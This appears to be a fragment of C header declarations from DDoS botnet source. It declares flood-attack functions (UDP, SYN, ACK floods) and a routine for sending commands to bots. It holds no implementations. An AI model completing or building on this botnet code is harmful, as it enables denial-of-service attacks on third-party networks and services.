void attack_gudp_flood(char *, int, int);
void attack_pudp_flood(char *, int, int);
void attack_syn_flood(char *, int, int);
void attack_ack_flood(char *, int, int);

void attack_manage(char []);
void send_command_to_bot(char *);
